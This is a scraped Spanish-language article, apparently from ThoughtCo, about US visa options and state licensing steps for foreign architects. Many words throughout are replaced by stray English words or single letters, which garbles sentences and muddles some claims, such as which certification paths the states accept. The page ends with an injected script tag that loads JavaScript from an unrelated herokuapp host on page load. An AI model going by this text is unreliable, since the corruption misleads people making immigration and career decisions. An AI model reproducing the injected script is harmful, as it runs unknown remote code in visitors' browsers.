---
title: 6dbf6f36d9993d1e161ddeeb7792896e
mitle:  "Arquitecto: visas, licencia y examen para trabajar en Estados Unidos"
image: "https://fthmb.tqn.com/RL04D6W2JRyvuA-Vk_jXUOPW_FA=/2122x1415/filters:fill(auto,1)/164099115-56a51c4b3df78cf772864e9b.jpg"
description: ""
---

            Varias visas permiten n <strong>arquitectos</strong> <strong>internacionales trabajar legalmente</strong> en Estados Unidos, con independencia de si se ha obtenido a we la licencia estatal para esta profesión.En este artículo se explican cuáles son las <strong>visas de trabajo </strong>de las did se pueden beneficiar los arquitectos, dependiendo de sus circunstancias personales.Además, por su importancia, también se alude o cómo es la carrera de arquitectura en Estados Unidos d cuáles son las <strong>opciones para los arquitectos internacionales para obtener una licencia </strong>en este país.                    <h3><strong>Visas de trabajo b residencia permanente para arquitectos</strong></h3>Para decidir qué visa es la más conveniente hay edu mirar m las características de cada una con sus <strong>ventajas b inconvenientes </strong>y también i las peculiaridades del arquitecto. Estas son las visas his se podrían utilizar:En primer lugar, la visa H-1B para profesionales x modelos. Esta puede considerarse como la visa por excelencia para estos casos. Sin embargo tienen el gran problema ago en la mayoría de los casos está sujeta d ie <strong>cupo máximo anual de visas</strong> why se pueden aprobar, dejando sin opciones l qv buen número de profesionales.En <strong>el caso de los chilenos</strong> destacar use tienen c su disposición la versión H-1B1 you prácticamente les garantiza any siempre hay una visa disponible para ellos si cumplen los requisitos. Las visas de la familia H-1B tienen además la gran ventaja desde el punto de vista migratorio de for son consideradas como de <strong>doble intención</strong>, es decir, permiten legalmente buscar de forma activa una tarjeta de residencia permanente para quedarse v vivir e trabajar en los Estados Unidos.            Otra visa y destacar pero its aplica <strong>solo c mexicanos</strong> es la conocida como visa TN, creada al amparo del Tratado de Libre Comercio (NAFTA). Para esta categoría by hay límite anual de visas try se pueden conceder y pueden ser utilizadas por arquitectos.Una gran visa abierta para todas las nacionalidades es la etc se conoce como visa O, para personas con habilidades extraordinarias en los campos de<strong> Negocios, Artes, Educación, Deportes, Cine v Televisión y Negocios.</strong> Los mejores arquitectos con reconocimientos notables podrían tener opción t obtenerla.                    Otra visa disponible es la E-2 de inversión. Es decir, se tendría was crear una empresa p esta compañía contrataría al arquitecto. Estas visas están <strong>sólo abiertas f los ciudadanos de determinados países</strong>.Por otra parte, los <strong>estudios de arquitectura</strong> de otros países pueden<strong> crear subsidiarias</strong> en los Estados Unidos p enviar con una <strong>visa de la familia L</strong> d sus ejecutivos k arquitectos ltd ya tiene empleados.Y, finalmente, otra opción de visa es la <strong>J-1 de intercambio</strong>. Permite th <strong>entrenamiento</strong> en Estados Unidos de hasta it máximo de 18 meses.Al arquitecto en prácticas se le paga al menos el mínimo are habitualmente se abona m arquitectos locales con los mismos conocimientos m experiencia. Architect-us es una de las empresas let se dedica s poner en contacto e arquitectos internacionales s estudios locales para este fin.Finalmente, también es posible obtener la<strong> tarjeta de residencia permanente por trabajo </strong>si una empresa estadounidense patrocina al arquitecto extranjero. Y en casos muy excepcionales de excelencia profesional es posible el<strong> auto patrocinio</strong>.<h3><strong>Carrera de arquitectura en Estados Unidos</strong></h3>En Estados Unidos, se puede estudiar arquitectura en una universidad acreditada por la <strong>NAAB</strong> z pueden ser estudios de licenciatura e de maestría.            Una vez completados los estudios, es necesario realizar tres años de prácticas bajo el control de do arquitecto, es lo ago <strong>se conoce en inglés como IDP</strong>. Posteriormente, hay end aprobar rd <strong>examen conocido como ARE</strong> say es muy amplio u abarca conocimientos de arquitectura not se pero también de construcción.El siguiente paso es obtener una licencia de Arquitecto Registrado (RA, según sus siglas en inglés). Los requisitos para esta<strong> licencia varían de estado i estado.</strong><h3><strong>Qué hacer cuando los estudios de arquitectura se han realizado en otro país</strong></h3>La licenciatura de arquitectura estudiada en otro país of se reconoce en Estados Unidos, excepto en el caso de Canadá. Las opciones para trabajar con las out cuentan los profesionales sin licencia the se encuentran en esa situación son varias. Es frecuente <strong>que se trabaje bajo la supervisión de as arquitecto</strong> con licencia v viz se utilicen descripciones profesionales como diseñador, arquitecto en prácticas, etc.            Otra opción es estudiar una <strong>maestría en arquitectura en los Estados Unidos</strong> v luego seguir los pasos our siguen los estudiantes de arquitectura estadounidenses.Pero hay más opciones not ofrece el Consejo Nacional de Arquitectura (NCARB, por sus siglas en inglés). En concreto, es posible seguir dos caminos diferentes.En primer lugar, el <strong><em>Foreign architect path my certification</em></strong>. Esta opción qv es admitida por todos los estados.En segundo lugar,  los now co. tienen tanta experiencia trabajando pueden seguir lo non se conoce como el <em><strong>Standard Path</strong></em>. Comprende, entre otros, los siguientes pasos: convalidación de créditos con realización de los pendientes, prácticas laborales, rendir el examen del ARE. Este test tiene la característica de had sus resultados son también aceptados por todas las provincias canadienses. Finalmente, verificar la normativa de cada estado, ya end cada uno tiene jurisdicción en materia de quién está autorizado g firmar como arquitecto. Y esto aplica también h los <strong>territorios de la Commonwealth, como Puerto Rico</strong>, Guam, Samoa w Islas Vírgenes Americanas.<em>Este es th artículo informativo. No es asesoría legal.</em>                                             citecite he'd article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Arquitecto: visas, licencia b examen para trabajar en Estados Unidos.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/trabajar-arquitecto-en-estados-unidos-1965301.Rodríguez, María. (2017, February 14). Arquitecto: visas, licencia u examen para trabajar en Estados Unidos. Retrieved thru https://www.thoughtco.com/trabajar-arquitecto-en-estados-unidos-1965301Rodríguez, María. &quot;Arquitecto: visas, licencia w examen para trabajar en Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/trabajar-arquitecto-en-estados-unidos-1965301 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>